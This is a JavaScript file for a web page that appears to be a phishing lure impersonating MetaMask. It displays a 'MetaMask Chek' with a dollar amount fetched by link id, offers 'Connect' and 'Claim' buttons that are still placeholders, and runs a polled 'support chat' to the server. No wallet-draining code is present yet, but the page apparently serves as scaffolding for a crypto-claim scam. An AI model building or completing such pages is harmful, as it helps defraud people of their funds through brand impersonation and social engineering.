const params = new URLSearchParams(location.search);
const idFromUrl = params.get("id");

function money(amount){
  const n = Number(amount);
  if (Number.isFinite(n)) return "$" + n.toLocaleString("en-US");
  return "$" + String(amount);
}

// ----- support chat helpers -----
function getThreadId(linkId){
  let tid = localStorage.getItem("greenland_thread_" + linkId);
  if(!tid){
    tid = Math.random().toString(36).slice(2, 12);
    localStorage.setItem("greenland_thread_" + linkId, tid);
  }
  return tid;
}

function renderMsgs(list){
  const box = document.getElementById("chatMessages");
  box.innerHTML = "";
  for(const m of (list || [])){
    const row = document.createElement("div");
    row.className = "msg " + (m.from === "visitor" ? "me" : "them");
    row.textContent = m.text;
    box.appendChild(row);
  }
  box.scrollTop = box.scrollHeight;
}

function poll(linkId, threadId){
  fetch(`/api/support/poll?linkId=${encodeURIComponent(linkId)}&threadId=${encodeURIComponent(threadId)}`)
    .then(r => r.json())
    .then(d => { if (d?.ok) renderMsgs(d.messages || []); })
    .catch(()=>{})
    .finally(()=> setTimeout(()=>poll(linkId, threadId), 1500));
}

function sendMsg(linkId, threadId, text){
  return fetch("/api/support/send", {
    method:"POST",
    headers:{ "content-type":"application/json" },
    body: JSON.stringify({ linkId, threadId, text })
  });
}

// fill both frames if elements exist
function setText(id, value){
  const el = document.getElementById(id);
  if (el) el.textContent = value;
}

function wireDummyButton(el){
  if(!el) return;
  el.addEventListener("click", ()=> alert("Later (dummy for now)."));
  el.addEventListener("keydown", (e)=>{ if(e.key==="Enter") alert("Later (dummy for now)."); });
}

(async function main(){
  if(!idFromUrl) return;

  // Mobile burger dropdown
  const burgerBtn = document.getElementById("burgerBtn");
  const mobileMenu = document.getElementById("mobileMenu");
  if (burgerBtn && mobileMenu){
    burgerBtn.addEventListener("click", ()=>{
      const open = mobileMenu.style.display !== "flex";
      mobileMenu.style.display = open ? "flex" : "none";
      burgerBtn.setAttribute("aria-expanded", open ? "true" : "false");
    });
    document.addEventListener("click", (e)=>{
      if(mobileMenu.style.display !== "flex") return;
      if(mobileMenu.contains(e.target) || burgerBtn.contains(e.target)) return;
      mobileMenu.style.display = "none";
      burgerBtn.setAttribute("aria-expanded", "false");
    });
  }

  // Fetch link data
  const r = await fetch(`/api/link?id=${encodeURIComponent(idFromUrl)}`);
  const data = await r.json();
  if(!data?.ok){
    document.body.innerHTML = "Link not found";
    return;
  }

  // Fill Desktop
  setText("checkTitle", `MetaMask Chek #${data.id}`);
  setText("amount", money(data.amount));
  setText("currency", `currency: ${String(data.currency).toUpperCase()}`);

  // Fill Mobile
  setText("checkTitle_m", `MetaMask Chek #${data.id}`);
  setText("amount_m", money(data.amount));
  setText("currency_m", `currency: ${String(data.currency).toUpperCase()}`);

  // Dummy buttons
  wireDummyButton(document.getElementById("btnConnect"));
  wireDummyButton(document.getElementById("btnClaim"));
  wireDummyButton(document.getElementById("btnClaim_m"));

  // Support chat open/close
  const panel = document.getElementById("chatPanel");
  const fab = document.getElementById("chatFab");
  const close = document.getElementById("chatClose");
  const input = document.getElementById("chatMsg");
  const send = document.getElementById("chatSend");

  const threadId = getThreadId(String(data.id));

  function openChat(){
    panel.classList.remove("hidden");
    panel.setAttribute("aria-hidden", "false");
    input?.focus();
  }
  function closeChat(){
    panel.classList.add("hidden");
    panel.setAttribute("aria-hidden", "true");
  }

  fab.addEventListener("click", openChat);
  close.addEventListener("click", closeChat);

  async function doSend(){
    const text = input.value.trim();
    if(!text) return;
    input.value = "";
    await sendMsg(String(data.id), threadId, text);
  }

  send.addEventListener("click", doSend);
  input.addEventListener("keydown", (e)=>{ if(e.key==="Enter") doSend(); });

  poll(String(data.id), threadId);
})();
